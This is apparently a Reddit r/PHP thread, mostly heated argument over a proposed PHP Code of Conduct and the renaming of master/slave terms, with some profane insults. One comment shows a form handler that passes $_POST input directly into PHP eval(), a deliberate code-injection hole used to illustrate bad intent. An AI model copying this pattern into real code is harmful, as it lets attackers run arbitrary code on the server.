A note on how Couscous is different from other solutions (disclaimer: I'm the author): it's not just a parser library but rather a tool, it takes a git repository containing Markdown files and compiles it into a website (based on default templates or a custom one). It's also different from Sculpin (which works great for blogs for example) because it's specifically targeted for documentation: you don't have to follow a directory structure which means you can store your Markdown files directly in the same repo as your code, making it easier to keep it up to date. It can also deploy directly to [GitHub pages](https://pages.github.com/) which means free hosting.
&gt; Shit like this should be rejected without question unless it is legitimately offensive, and it isn't. Why isn't it "legitimately offensive"? And who are you to judge? If changing one or two words provides benefit some people, what's the harm in it? Besides, the replacement terms are more descriptive (it's not so much that one controls the other, but rather one is a mirror of the other). Incidentally this applies to ATA as well (the "master" and "slave" in parallel ATA are actually peers, there's no power relationship).
_What_ is the benefit? Arbitrary feelings? &gt; And who are you to judge? Who is anyone to judge what is deemed a problem of hurt emotions?
&gt; A _guy_ made a suggestion So? Why is that a factor?
&gt; What is the benefit? Arbitrary feelings? Some people feel more comfortable contributing. Some people don't have jokes made about them whenever they talk about their database setup? That's a benefit. If words cause people distress, what's wrong with avoiding them? &gt; Who is anyone to judge what is deemed a problem of hurt emotions? The people who experience them.
&gt; All of this shit just seems like overly sensitive people forcing change for the sake of feeling better about themselves and not much else. Then carry it like they're a champion of oppressed people when really its an ego boost. Exactly, I lost a lot of respect for Phil over this whole CoC debate.
Out of interest, why have you bundled nginx in with the PHP container and not run them as two separate containers?
Why? What makes you think he is acting in bad faith? He's talked to people who say they appreciate these actions. More to the point, what's wrong with doing things for the sake of others? It makes you feel good, but all altruistic actions are like that, and why does it matter?
&gt; The proposed CoC tells them to shut up, even on their personal social accounts (like facebook) No, it absolutely positively does not. [Go read the RFC](https://wiki.php.net/rfc/adopt-code-of-conduct#representing_the_project), please. &gt; #####Activities on a social network &gt; &gt; On social networks, the CoC is only considered to apply if the context of the conversation makes it clear that the person represents the PHP project. &gt; For example, merely having “PHP contributor” in an about or bio is not enough to be “representing the project”. However, a conversation about the PHP project itself (including RFCs, etc) is enough to justify “representation”. This is one of many changes to the RFC that have been made in response to constructive criticism. 
I asked OP's questions while back and Sculpin is what I settled on. I don't think it matters that it's not targeted to documentation. In fact that probably makes it more flexible.
Plus he opted not to talk about the Opalgate incident... which is a more concrete example of extremism and wielding politics as a tool to oust actual contributors.
Well I was talking more generally rather than in the world of PHP.
Yeah; no idea how that got -26... :-/ 
It *literally* .... and I mean **literally**, affects you in *zero* way. And what if it only benefits a single (not you) person? I'd say it's worth it. This even goes back to mini-shit storm in CodeIgniter with their Models and the $babe variable, which Sturgeon was [on the wrong side of](https://github.com/bcit-ci/CodeIgniter/pull/1615#issuecomment-6967056). If someone takes the time to make a PR and it doesn't affect you all... leave it the fuck alone. There's a thing called "empathy". Try and get some of it.
I think one of the things is that if you have a code of conduct written properly you _can't_ get fired for making a dongle joke because the rules allow it. If you don't it's even sketchier because you can just get kicked out because the majority decide they don't like you.
I mostly agree with all of that. And I think maybe that's the most important takeaway from this: people with large internet followings should be more careful about how they criticize other people online. (Then again, anything really can go viral so that's not a perfect solution either) I see the doubling-down happen online all the time as well, and again no particular side or ideology is worse about it. Basically, if you're even tangentially involved in an internet shitstorm, you're going to get abusive messages regardless of what you did or what your position is. You're naturally going to turn to your immediate social circle for support and they're naturally going to circle their wagons tell you you're right. That gives you the emotional support necessary to deal with hundreds of strangers pummeling you with death and rape threats and doxes, but yeah it also leads you to not question yourself and makes you unable to engage with your more sensible critics because in your mind everyone's either with you or with the people threatening to kill you or trying to get you fired or whatever. I don't have any good ideas for fixing that, though.
Primary/Replica vs. Master/Slave vs. Write/Read are all pretty common. I'd say the problem is more the way the whole CoC thing itself. Codes of conduct should be open and inclusive *but* &gt; https://wiki.php.net/rfc/adopt-code-of-conduct &gt; http://contributor-covenant.org/version/1/3/0/code_of_conduct.md &gt; This Code of Conduct applies both within project spaces and in public spaces when an individual is representing the project or its community. Things like this mean you have to use PR speak 24/7 when in public. I'd rather not be involved.
So you lost respect for him because he has a different opinion that yours ?
There's that aggression! 
When testing junior web-devs, Logic, Algorithm Writing, Problem Solving. - Ask them to solve a hard logical puzzle. - Ask them to write a hard algorithm in pseudo code. - Ask them to solve a hard problem. The rest comes from experience. You cannot fix a person who does not think logically, whom cannot write an algorithm [which is literally a set of steps], and you really really want the people who can solve problems. 
I had this after I tried to switch my theme. It ended up with a reinstall of PHPStorm.
You're going to hate this entire series. 
This is an incredibly important topic and one that is very close to my personal experiences with anxiety. It was crippling and really was starting to effect my personal life. I actually only got through it by taking up daily meditation which has actually been incredible for many other areas of my life too. If anyone reading this is suffering some form of anxiety, I know it can be really horrible and I want to do anything I can to help. Please feel free to PM me and we can chat about it. Also remember this: its okay to go to the doctor when you get a physical ailment, a mental ailment is no different so don't beat yourself up and label yourself as 'going mad'.
That's a very good question that we're trying to get an answer to: https://github.com/drgomesp/symfony-docker/issues/7
If you don't care about the conversation, just hide the posts and move on. That's what I'm (mostly) doing.
&gt; That gives you the emotional support necessary to deal with hundreds of strangers pummeling you with death and rape threats and doxes, but yeah it also leads you to not question yourself and makes you unable to engage with your more sensible critics because in your mind everyone's either with you or with the people threatening to kill you or trying to get you fired or whatever. &gt; I don't have any good ideas for fixing that, though. I don't either, in all honesty. Conscientious moderation might help, but it's really only possible on a very small scale, because you have to get lucky enough to find a moderator who is able to see past their own political beliefs and try to be as even-handed as possible. Frankly, most moderation is garbage. Most of the time, moderators are either too hands-off (that is, they fail to enforce basic standards of professionalism), or they're horrendously biased (that is, they defend their tribe and are super quick to ban everyone else for so much as polite disagreement). And the larger your community is, the harder it is to maintain decent moderation, because you need more and more people to do it, and therefore you have a much greater chance of ending up with garbage moderators. Even here on reddit, I know of exactly *one* subreddit where the mod team manages to keep things civil and allow controversial topics to be discussed without heavily favoring one set of opinions over another. And, surprise surprise, a lot of the people there are fairly moderate, and the discussions, while contentious, are mostly free from abuse. The more extreme elements tend to leave, because they get reprimanded (or banned) for flinging insults, and people are allowed to question them when they lie or exaggerate. I don't know if that can really be replicated on a large scale, though. It seems to me like if a community gets big enough, either they give up on moderation altogether, or the moderation team becomes a clique bent on enforcing their viewpoints. I suspect that maybe the internet would be a somewhat less hostile place if there were more room for civil disagreement. Edit: This actually connects very well with CoCs. Conceptually, I agree with the idea of a CoC, but in reality I suspect it will either be ignored or wielded as a weapon by a political clique.
I must say /u/philsturgeon is positively restrained in this article. Only 3 bullshits, 3 shits, 2 assholes, one fucking, and one shitload in the whole piece!
I'm outraged because instead of talking about code, we're talking about this. A good CoC would simply be this: * Be excellent to each other * Party on, dudes! * No politics
Is there something about master/slave in the proposed PHP CoC (I haven't read it, this whole thing seemed too drama-filled)? I thought we were discussing the whole mess when Django changed it.
I went through the same thing over the last few years. I didn't realize that it was anxiety for the longest time. I remember driving home sick while on the phone to my wife, thinking I was having some sort of heart attack. I even went to an Urgent Care center with heart attack symptoms, only to be backhandedly accused of being on cocaine. Today I just talk to my wife and friends about dealing with anxiety like its simply a part of me and it has helped tremendously.
Yeah and you start to learn what your triggers are and how to avoid then. Talk it out!
To be fair - I think it depends on where you live/work with how peoples perceptions of sensitivity come from. I'm from Canada - and basically in either Vancouver or (Downtown) Toronto in certain areas it's easy to offend someone with any off the cuff remark.. however while spending time in Texas, Alberta, Saskatchewan, Manhattan I found people didn't have these issues. I deal with people that are all over the spectrum.. nothing can hurt them, they dish it all out and people that are so sensitive they will be intimidated and offended by simple assertions...
Literally what aggression?
1. That ruins the quote. Plus, Abraham Lincoln wasn't referring to only the men with that statement. 2. As Kel said in Good Burger, "I'm a dude, he's a dude, she's a dude, 'cause we're all dudes." 3. That breaks the "no politics" rule.
Stating it applies in public spaces means it applies from Facebook to Twitter to when talking to someone on the street. How is this a misrepresentation?
What if my being excellent differs to your being excellent? ;) COC's are hardly multipage novels, but they are just long enough to be specific. And even THEN, there are folk screaming about it being too vague.
&gt; Besides, the replacement terms are more descriptive And that's reason enough to change them out. That it provides some benefit to some people is a nice bonus.
Ah! Yes, the change I am hoping I can get from others by talking about this stuff is the change I have gone through myself. I used to think people were being ridiculous and extremist and these things didn't matter (as do many of you above) a few years ago, then over time I've come to realise that was incredibly daft and the absolute definition of ignorance. I posted a bit about me going through that change here: https://philsturgeon.uk/feminism/2015/08/17/women-speaker-ratio-conversation-loop/ Might be interesting. Dunno. Also "leave it the fuck alone" is a fine thing to say. Don't confuse swear words with "IM SO ANGRY RIGHT NOW". That's a deflection that a lot of people are using in this conversation and it's highly frustrating. Plenty of grown-ups use swear words, and it doesn't mean we're foaming at the mouth on our keyboard, or even particularly annoyed, as much as some people would like to pretend. :) 
I love that movie. 
Then I'd add a 4th bullet point to my project's CoC: * /u/TexasWithADollarsign has final say on issues of excellence, partying on, dudeism, and politics.
Yep. OT but a shame that series went down the plot-tubes after MGS3.
&gt; yet some contributors still feel unwelcome. Why does anyone expect to "feel welcome"? This isn't kindergarten. You don't get participation rewards for life. The first time you submit a patch to a big project is nerve-wracking, regardless of your melanin or genitalia. I'm pretty sure everyone goes through that. This nonsense about "feeling welcome" and making a "safe space" really scares the crap out of me. It's Orwellian.
I think I'd get waaay too many PMs that way.
I need them to know basic stuff, at least some knowledge about a framework, not just to follow a tutorial on how to create a CRUD app.
I agree, but I'm not allowed to test their's IQ :) ... law stuff
&gt;plot-tubes You misspelled nanomachines.
So you're basically saying: &gt; It's controversial, people argue about it, and it basically splits community¹ into two parts, so we should force it down their throats already! ¹ *(whatever that is)* Am I right? Cool.
The lack of self-awareness in this article is pretty striking. Sturgeon derides "#NahItsFine" when it's used against things he wants to change, but says effectively says "#NahItsFine" when someone doesn't want his preferred changes. He says #NahItsFine to the people annoyed at the Master/Slave terminology changes. And anyone against against authoritarian cultural policing is a "dupe" for saying "#NahItsFine" when people come in demanding we conform to their preconceived notions. Like every political ideologue, "It's OK when we do it" is the standard. I'm curious how "#NahItsFine" he would be if the one making the changes was from the Pat Robertson brigade, rather than his own camp. "Daemon", after all, offends them, so should we change that terminology? 
Well, *I* would say "I keep my $X opinions out of my work on open source projects because those opinions are irrelevant to the project," but that wouldn't address your question. I don't know exactly how that situation would be addressed under the RFC. The entire rest of this post is speculation and druthers. If I was sitting on the mediation team, I'd view the introduction of project membership into an existing thread about a subject contentious enough that it could cause a complaint to be raised as bogus. The person doing the mentioning is likely trying to bait for a specific negative response, in an attempt to create something worth complaining about. I don't think that type of situation should be considered valid, doubly so if that same person that baited for a response went on to actually lodge a complaint. Even then, that's one hell of an edge case. The implication is also that it's assumed that people making complaints are bad actors and are attempting to abuse the system, and I think that this is a very difficult point of view to support. The small handful of bad actor complaints out there should be used as examples of exceptions to handle cleanly in the ruleset, not as the expected normal way things will work. There's also a huge, huge gulf between "Man those $GROUP are acting all $BAD_WORD again" and "That fucking $GROUP_MEMBER declined my pull request." The RFC dictates that [the US legal concept of the "Reasonable Person" test](https://wiki.php.net/rfc/adopt-code-of-conduct#reasonable_person_test) be used when evaluating what happened. The first statement is rude, crude, but was it "harmful"? Maybe, but if it's posted on social media and seems to have nothing to do with the project, even if someone took enough offense to complain, the complaint probably wouldn't have any merit. The second though, directly calling out someone in such a way, there's no doubt that this is "harmful" and it seems related to the project, so that complaint might have merit. So what happens now? [The process kicks in](https://wiki.php.net/rfc/adopt-code-of-conduct#complaints_procedure) and a person on the mediation team gets in contact with everyone and [does their damndest to resolve the conflict](https://wiki.php.net/rfc/adopt-code-of-conduct#potential_actions): &gt; The Community Mediation Team should make every reasonable attempt to defuse the situation without having to resort to punitive action. This includes establishing a meaningful discussion around the incident, giving the accused offender the chance to apologize (privately or publicly, depending on the incident) or **determining that no action is necessary even if the CoC was violated.** Emphasis added. And for most cases, it stops right there. But what if it doesn't? &gt; In **extreme** cases, when the Community Mediation Team finds that a certain project member **continues** to violate either the Code of Conduct or Constructive Contributing Guidelines, more punitive action **might** be required. Check out that wording. Emphasis changed from the original document. Only when the person being complained about continued to be a jackass in the context of the project does any sort of actual possible consequence kick in.
Again and again people quote from the CC [instead of the RFC itself](https://wiki.php.net/rfc/adopt-code-of-conduct#representing_the_project), which I'm going to paste here in a huge font because everyone keeps fucking missing it: &gt; #On social networks, the CoC is only considered to apply if the context of the conversation makes it clear that the person represents the PHP project. &gt; &gt; #For example, merely having “PHP contributor” in an about or bio is not enough to be “representing the project”. However, a conversation about the PHP project itself (including RFCs, etc) is enough to justify “representation”.
If people took context into consideration, maybe they wouldn't always be so upset?
Sturgeon being an open and shut case.
How do you rectify the difference between "spreading equality" and blaming "white-dudes" for the lack of it?
If you expect me to take that seriously, rewrite the Code of Conduct and host it yourself as part of the RFC. Otherwise, I'm going to assume what will happen with every other place I've seen stuff like that in a RFC that isn't in the actual document ... the document will be used, no one will include the clarifications, and the RFC will be forgotten.
Can you people just stop opening a thread about this every single day?
And if someone "forgets" the RFC, do you know what happens? Someone notices and raises a stink. The mediation team member that didn't do it right resigns because it's the right thing, or is voted out via simple majority if they're a jerk about it. Abuse prevention measures are *built in* to the system. Also, you really need to stop assuming everyone will be an idiot by default. It's an incredibly unhealthy point of view. 
&gt; I won't dignify your article with a considered response What the fuck is that whole post, then?
It depends exactly on what and why, but often any sort of message queue will work fine, with something like supervisord keeping the message queue listener processes alive. I'm a fan of Gearman, as it's designed exactly for that case, a background processing queue.
My bet is that the distinction you point to is going to be removed shortly after the CoC vote passes (which I hope it never will). You seem to think that once we've voted on a CoC, that's the end of it. It's not. That's just the start. We'll quickly have new RFCs proposing additions/changes to "fix things we missed". The CoC is a trojan horse of radical feminist identity politics. We'd be fools to allow it.
There's not a problem if they follow the tutorial, the question is: what can I do to maximize my chances of hiring a good person. I was looking for a test. A discussion will only waste my time (I don't want to be blunt but it happened in the past). 
Interesting, I always found myself working against WordPress trying to get things working. I have worked in the Rails/Custom Web App world and recently switched gears into Laravel. I would think SQL would be the easiest component to web based apps. Good to know if one ever gets asked to hire a developer.
Step 1: don't be a dick. Step 2: see step 1.
This seems to have absolutely nothing to do with PHP. Why is it posted here?
&gt;Interesting, I always found myself working against WordPress trying to get things working. I have worked in the Rails/Custom Web App world and recently switched gears into Laravel. I would think SQL would be the easiest component to web based apps. You're thinking fairly low level, I was talking in terms of installing WP, a theme and changing a few colours/bits of layout around and then calling themselves developers. Not developing plugins or modifying core code.
For starters, because they made the change for because of its "racial" connotations, despite slavery having absolutely nothing to do with race. Secondly, because some words happen to have more than one definition in certain contexts. One good example being slave.
&gt; What is the benefit? Arbitrary feelings? YES! Because people's feelings matter! Stop being so self-centered and have some empathy! It's incredible the lengths and hoops that are being required to make an inconsequential change that makes a few people feel less awkward working with a framework.
I completely agree with you and the points - I'm always looking at the possibilities, mainly because I've seen first hand how even the slightest bit of leeway can lead to a negative outcome.. and a completely different outcome that would be deemed reasonable. In a way I like absolutes - there's absolutely no way to snake your way around it.. as much as I would disagree with it (Some of the absolutes in cherry picking some of the controversy CoCs). When you start adding things that could be interpreted you enter in a deep dark hole that if someone really wants to they can manipulate the outcome. It becomes dangerous when someone who isn't liked very much by someone is "triggered" and they are set on ruining your day. Then of course you have this precedent.. even if that one instance didn't amount to much, the next "minor" incident that should also have no bearing all of a sudden matters more. Especially when these tangents are made by people that are quasi-protected. A voting member would take something more seriously from their figurative little brother or sister than random person who they have no personal connection with. Most things start out with good intentions
thanks will take a look at that.
Isn't this one of the common cause for lack of respect?
I'm in the UK, apart from particular niches (academia, some public bodies, local gov) this shit really isn't a factor. Every place I've ever worked would have violated this CoC on basically a daily if not hourly basis.
&gt; except when they turn to their community of peers for support, they're harassed even more And how is that different from what men experience? From what I've seen, men who turn to other men for "support", are inevitably shat upon even more. &gt; men are welcomed and the women are not What does "welcomed" mean now? It seems "welcome" has become one of those things like "safe space" that doesn't seem to have the normal meaning anymore. 
[removed]
&gt; So we as adults shouldn't judge intent merely based on the words used? No we totally should except Phil..and any of the people on the "right" side of this debate because that's fine. That's how it works right.
There is nothing inherently wrong with an internal CoC. The problem is it really should be restricted to PHP project spaces only. Requiring people to be professional within a professional environment is reasonable. Requiring people to be professional outside of that environment isn't. Expanding it beyond PHP's mailing lists, site, RFCs, etc. is a problem waiting to happen. 
Job seeker/ college student here. I applied for a job I'm very strong in SQL and the company was very impressed I could do a left join, they also gave me a trick question comparing true to itself with an = instead of an is. They said that have been asking that question for 5 years and I was the first one to get it right. 
Honestly if they can configure CodeIgniter then they are worthy of junior engineer status in my book. 
Well, that and it should be restricted to the PHP project spaces. People shouldn't write code of conducts that can be argued to apply to a person's entire life in public spaces.
1. Claiming to have good intentions doesn't give you any wild card. Hitler wanted to improve the life of his fellow citizens. The road to hell is paved with good intentions. Frankly, I'm offended that you think this argument could have had a chance in persuading me. 2. If the stories the media tries to bring to the public are blown out of proportion and we're duped, how do we know your stories are not blown out of proportion? I am again offended by this line of argument. 3. Even after you acknowledge that so many social justice initiatives back-fired in ridiculous ways we are supposed to expect that... this time is different. Offense no 3. 
[removed]
Welcome to PHP. Thank you for blogging about the life and times of *absolutely fucking nothing*. We hope you enjoy your stay.
No it's not.
Thank you for writing this. Thank you for putting my thoughts into words better than I ever could. I needed this.
http://i.imgur.com/1Mi9hTw.gif
What happens when someone isn't "excellent" to someone else and is punished? You don't think there'd be a community shitstorm over the meaning of "excellent" behavior?
I guess I'm seeing this from the perspective of my own projects, not a larger technology like PHP. Generally speaking, excellence would be like pornography -- I'll know it when I see it. More importantly, I'll know the opposite when I see it. However, the "no politics" rule was meant to extend to any disruption or greater discussion about anything other than code to avoid potential shitstorms; any Opalgate-like discussion would be quashed immediately because it violates that rule. I've since amended my initial CoC in one of my other comments, adding: * Code &gt; people I also clarified the "no politics" rule to be: * No politics or external issues Those two make it clear that contributions outweigh personal beliefs, and to keep arguments concerning personal beliefs out of the project. Any discussion of "excellence" dealing with outside drama therefore will not be entertained. On my personal projects, I've added a final bullet point essentially saying my word is final.
&gt; but says effectively says "#NahItsFine" when someone doesn't want his preferred changes. Wait, where? Are we talking about the 4 year old CodeIgniter issue again or whats happening?
You got my vote.
You're making assumptions. I'm saying don't make assumptions. Swearwords have no correlation to anger to many people. 
Lol no Ben. I'm saying don't make assumptions. Swearwords have no correlation to anger to many people. 
1. Slippery slope argument akin to "If we allow gay marriage next we'll have bestiality!" 2. Random assumption of malicious intent. 3. Weird assertion that RFCs work different to how they work. Are you ok? 
&gt; Abuse prevention measures are built in to the system. &gt; Also, you really need to stop assuming everyone will be an idiot by default. It's an incredibly unhealthy point of view. Assuming other people may have bad intentions comes with this lifestyle. &lt;select name="action"&gt; &lt;option value="add"&gt;Add User&lt;/option&gt; &lt;option value="edit"&gt;Edit User&lt;/option&gt; &lt;option value="delete"&gt;Delete User&lt;/option&gt; &lt;/select&gt; &lt;?php eval("do_action_".$_POST['action']."();");
I agree, although I also use a Windows machine (8GB RAM, nonSSD HDD, 8 core i7) and never had half the issues mentioned here (I've used every version since 3.5). Wonder if the Mac version is wonkier for some reason? Still, I left all the language injections (#1) as they were, as I use all of those. I did turn off a bunch of stuff in #2 and #3 and noticed my startup time go from about 30-45sec down to about 6 sec. 
Aww diddums, can dish it out but can't take it.
This is a good point. I've always noticed that artificially promoting the spread of equality often has the side effect of discriminating against those who would not otherwise be discriminated against (the asian community in higher education for instance.)
You are assuming the entire group shares your views then and nothing I can say will change your mind.
I'm not going to get sucked into your culture war tactics of equivocation and marginalization. You're being unapologetically insulting and sexist. As for "GamerGaters", yeah, I'm defending them. I don't appreciate or condone character assassination. There are certainly lots of shitheads involved in this culture war, but the only truly horrific behaviour I've seen has been from those coming from the radical feminist side of things. They've been terrifyingly successful in branding everyone who opposes them (even moderate feminists) as hateful harassers. Look at Gregory Alan Elliot. He disagreed with feminists on Twitter, and now his life is ruined, despite having been cleared of wrongdoing. They were trying to brand him as a pedophile for nothing more than having a political disagreement. Those who would do such a thing are horrible people. I hope you don't condone that sort of behaviour.
 Considering how widespread software is in the modern age and how global software is, I don't think the act of creating software can be separated from the politics of software on some level. You must address political issues if you have a product used by many people across the world.
[removed]
I didn't want this posted here, somebody else did that. But now that it's here, and - in between arbitrary personal attacks - some of you have decided to discuss the PHP CoC, which is not even what this post was about. I planned a followup to remove some FUD from the conversation but we've jumped the gun a bit, so lets go. Can you please for a moment think about these points. 1. The draft PHP RFC initially used Contributor Covenant as a potential option because it is widely adopted. That seems fine. I'd be ok with the Golang one too, it seems pretty cool. Not everyone who's into the idea of a CoC is in love with the Contributor Covenant. 2. Whilst being indifferent about CC, I do not entirely agree with Coraline Ada Ehmke running around the internet telling projects to implement it. I can't blame her, I know why shes doing it, but that doesn't mean I agree. Conflating the concept of a CoC, with her politics, and assuming that anyone who likes A must also like B-Z is incredibly daft. 3. Even if Contributor Covenant was implemented, Coraline Ada Ehmke would have no powers over the project whatsoever. Her politics as a person have literally nothing to do with a project implementing it. 4. Having a CoC (even the Contributor Covenant itself) would actually _stop_ something like opalgate from happening. If somebody came running over the the PHP github repo and said "Somebody said something I don't agree with you should kick them out" then the mediation team would like the issue and say "Please report this to the mediation email, and follow the process over there. We'd ask you to stop posting about this while we go through our private mediation" and tadaaaa, problem solved. The CoC would actually _protect_ you from "whiners" who can't handle your politics, or any of the other imagined scenarios /u/pmjones has been posting about non stop. 5. Most importantly, people are getting really confused about the extent of this: &gt; Activities on a social network &gt; &gt; On social networks, the CoC is only considered to apply if the context of the conversation makes it clear that the person represents the PHP project. &gt; &gt; For example, merely having “PHP contributor” in an about or bio is not enough to be “representing the project”. However, a conversation about the PHP project itself (including RFCs, etc) is enough to justify “representation”. The basis of many peoples concerns are that some evil group of SJWs are going to come and take all of their free speech, and this explicitly says that's not the case. /u/frozenfire in here said: &gt; My bet is that the distinction you point to is going to be removed shortly after the CoC vote passes (which I hope it never will). You seem to think that once we've voted on a CoC, that's the end of it. It's not. That's just the start. We'll quickly have new RFCs proposing additions/changes to "fix things we missed". &gt; The CoC is a trojan horse of radical feminist identity politics. We'd be fools to allow it. This "bet" is completely imagined, and one of many slippery slope arguments I've seen in here. That's not how the RFC process works, and that's not what anyone wants. I would _love_ it if a CoC could be as simple as "Be Nice" or "Dont Be A Dick". Really, I would. But the text of the CoC is regardless to the point of the rest of the RFC, which outlines the process of handling with complaints. A weak toothless CoC makes it useless, and we've all gone through multiple keyboards for nothing. Anyway, I'm not expecting to change any of your minds, I just wanted to explain that a lot of you seem to be basing opinions and replies based on a fundamental misunderstand of how things work. So far I'm the only person in this 115+ comment thread who this RFC affects. So maybe you don't need to worry about it so much?
Perhaps you are unaware that slavery existed before there was an America. The word slave means to be controlled by, it does not necessarily mean to be illegally owned and imprisoned by. Specifically in the US Deep South.
[removed]
Lol no was just laughing at the one-sidedness of moderation here in the past. 
Sorry for assuming you were assuming, I saw the question mark but that didn't stop it reading like you'd already made some opinions. &gt; True but they do in fact have that correlation to others. Why are these peoples feelings inconsequential? I didn't say anybodies feelings were inconsequential. I'm saying there is a conflation regularly used by anti-CoC people (and plenty of others) that you're either a hippy sitting around singing CoomByAh and cuddling flowers, or you're a super uptight formal and correct person. I'm saying that people live in the middle of that, and I happen to use swear words like many other adults. If you say "Hey Phil, I don't like it when you reply to me with swear words" Ill respect that, but if somebody wants me to feel bad that they witnessed me say "shit" then that sounds like language policing at its worst, something many people in here think a CoC would enforce. Get what im trying to say?
I agree with you that the use of buzzwords and hashtag stupidity only results in these dialogs devolving into more abuse of buzzwords and name-calling. It becomes "my power against your power". So it behooves those in the established party to perform a cost-benefit analysis when a group of people comes forward saying "this is important to me". Because if you *do* dismiss this group of people, the next thing for them to do is to flex their muscles.
Damn /u/philsturgeon, now you've drank the kool-aid too? I'm starting to think PHP is fucked. Sanity and logic? Unbelievable. You're better than this. "If you don't agree with me, your opinion is shit!"
They pulled a fucking "duck tales" move and rewrote history.
Man, if only there was a code of conduct he could follow to ensure his good behavior...
Don't cover it. It's a waste of time for everyone involved including yourself.
Please do. Would be a better place without all this non-programming related bullshit. You can take all that with you and we go on with the programming.
You mean like you've been doing by spending ten times more time arguing *against* the proposed changes than the changes themselves would take. Yes, you're very efficient programmers.
Sorry, it's 5. Each ```:param_name``` should be replaced with ? and then bound in proper order. The trick is: If there is no filter set, default it's value to ```*``` (or something else), then compare it to ```*```. If it is set the value will be different from ```*``` and other conditions will be evaluated.
&gt; So far I'm the only person in this 115+ comment thread who this RFC affects. Why? We all use PHP
the web is "context free". Look for justine sacco story on google, a joke made her loose her job because it was taken "out of context". 10 000 people will take something said 10 000 different ways. It takes just one influent inquisitor to destroy your life.
Thanks for writing this article and your contributions to PHP. Every professional setting I have ever worked in has had a discrimination, harassment, sexual misconduct, stalking, and retaliation policy. A solid code of conduct helps improve diversity in the workplace even when there are no people actively causing problems. Women and other minorities are woefully under represented in the technology workplace and that is an actual problem that needs addressing in the broader society in general. If the PHP community can help make people more comfortable contributing then it'll be worth all the headache that comes with people's reactionary rhetoric. Thanks again.
&gt; Slippery slope argument akin to "If we allow gay marriage next we'll have bestiality!" &gt; But that's happening, you didn't need a code of conduct before , now you need one ? in 1 year , 2 years , ... it's clearly that some people will push for harder language (i.e. public and private space ). It's about the power of a few. Just look at what happened with the scalaz library community. 
I've been doing web development for years and my SQL knowledge is utter shit. It honestly just hasn't come up alot. Either I'm working with something like WordPress or a framework that uses and ORM. I know I should be better at it but - again - it really hasn't been a very important part of my career.
&gt; The ones **fighting** these... Voicing a different opinion is not a fight. &gt; The ones fighting these measures are, at an overwhelming majority, white dudes. I don't like to do this but [citation needed].
Are you following along even with the changes being made? Derick is using github to collaborate on the text of the RFC (see: [this repo](https://github.com/derickr/php-community-health)) and the current CoC text has this: &gt; This Code of Conduct applies both within project spaces and in public spaces _when an individual is representing the project or its community_ — **specifically**, this means anywhere you are **using your @php.net email address** (e.g. via email or on a contact me slide), or are _otherwise presenting yourself as an official representative of the PHP project_. (emphasis mine… though the original text also is mine. :P) 
It's so fucking stupid and vague and unnecessary.
&gt; The 'weaker' setup is a quadcore 2.8ghz with 4go ram It's far from a low end machine, provided you have an SSD.
JFC… are you fucking kidding me? This CoC can do _nothing_ except remove a person from having access to the ML, Social Media, and their @php.net email address. That's, and the steps that lead up to it (warnings, etc) are _literally_ it.
You were fondled while writing PHP code or discussing it online? No? Then. What. The. Fuck.
I don't disagree with that. I'm going to propose the mods put up a sticky thread suggesting the discussions around the CoC get moved over there. Edit: s/tall//
See edit
Maybe you were turned off before by the complicated Symfony security classes. If so, starting with Symfony 2.4, the SimpleForm* classes were introduced and, as the name implies, simplified the original system a lot. 
Well, if you'd stop pushing your ideological agenda into our programming space, we wouldn't have to and we could get back to programming, thank you very much. 
Voicing a different opinion is not a fight. Working to suppress opinions that support the decision, open mockery and aggression, and general nastiness is. And if you've been following all this at all you have to have seen what I'm talking about. The CoC RFC was abandoned because the PHP Group didn't have the time to put up with that shit anymore. That's attrition, not opinion. Well for starters, we know that there is a serious disparity in the STEM fields by sex and race, so most of us *in general* are white dudes: https://www.census.gov/prod/2013pubs/acs-24.pdf. It's not a stretch to induce that the demographics for discriminatory behavior at least *match* the demographics for the STEM fields in general. I'll accept that any argument that *barely anyone* arguing with these proposed measures is someone other than a white dude is merely hypothesis, but "overwhelming majority" still applies. It's impossible to really get reliable statistics on what this field would look like if it had more equality. So yes, I have to accept that my statement cannot be proven and is based solely on sound, educated logic, current societal attitudes, and observations of other fields.
You know what, when you dismiss people saying that something is important to them for long enough, they're just going to start flexing their muscle instead. So at this point I'm in the "cry me a fucking river" camp. If the only reason you're a programmer is because other fields require you to treat your peers with respect and this one doesn't, then you get no sympathy from me.
This is totally constructive, and a great post! Bravo.
I think the 100ish people posting in here would be a little annoyed if you deleted their comments. I'd bloody love it. Feel free to delete the entire thing. I took screenshots of the most ludicrous bits. Instead of pretending that inclusivity is not a problem in tech ([it is](https://philsturgeon.uk/2014/05/31/the-pocket-guide-to-sexism-in-tech/)), how about you respond to my points and stop trying to derail things.
OK, that's a legit concern — you know how you help it not become a reality? _Participate_ in the ongoing process. As for `T_PAAMAYIM_NEKUDOTAYIM`, it's super easy to google, much more so than `::`. Just sayin'. I really think we've got this one covered as far as education. Have you tried to read through the backtraces of most other things? Take Rails for examples, or Ruby itself. Python is a bit better, but _nothing_ has the same simple clarity of the _majority_ of error messages in PHP from my experience, except maybe C.
Can you point me to a good resource that explains this.
Fair comment. I try, but it's hard to legitimately say "Oh I understand your point and that's fine with me" when people are defending things like GamerGate. I figure we as a society mostly agree about that sort of thing but I forget that upsets people. Talk to me privately about the book thing, I recognize the name but dont remember the interaction. Hopefully it was a misunderstanding! :)
And then you have to worry about the nihilists who don't give a fuck and just delete the repo :/
Whilst it does baffle me how badly the PHP and Ruby communities struggle with things like this compared to others like Python and JavaScript, I don't think a fork would really help. Anything close to PHP and people would just wander over and gross up the sub-reddits for that language too. Luckily, what happens on /r/php doesn't actually matter much for the vote. One or two vote holders might swing by and think "These angry people accusing Phil of jacking off over this argument have a point. Lets vote against the CoC!" but in the end, more people will favor it than not. 
[removed]
&gt;so most of us in general are white dudes and &gt;It's not a stretch to induce that the demographics for discriminatory behavior at least match the demographics for the STEM fields in general. Using your theory, the majority arguing both sides are "white-dudes". Therefore the fact that they are "white-dudes" has no correlation for or against it. Considering that they are the majority on all sides, is blaming them politically motivated? 
&gt; it's always the same tiny circle which is pushing its agenda Specifically who?
Somebody else covered this for me. https://www.reddit.com/r/PHP/comments/433ioy/why_is_everyone_outraged/czfl1pl 
Exactly, you start avoiding similar circumstances and you feel better for it. :)
Your article just swayed me to vote for Trump. I'm sure there are more. Hope you're happy. 
Nice to hear your story. You have to do what ever feels right to push anxiety out of the way and as well as meditation and sports, talking is one of the best solutions.
Thanks for sharing your story, mate. I'm glad you have found solutions and I'm especially glad you have taken the time and shared that experience with others. I'm sure some people will find it helpful. Thank you!
This is kinda hilarious lol
Hahahaha. Damn.
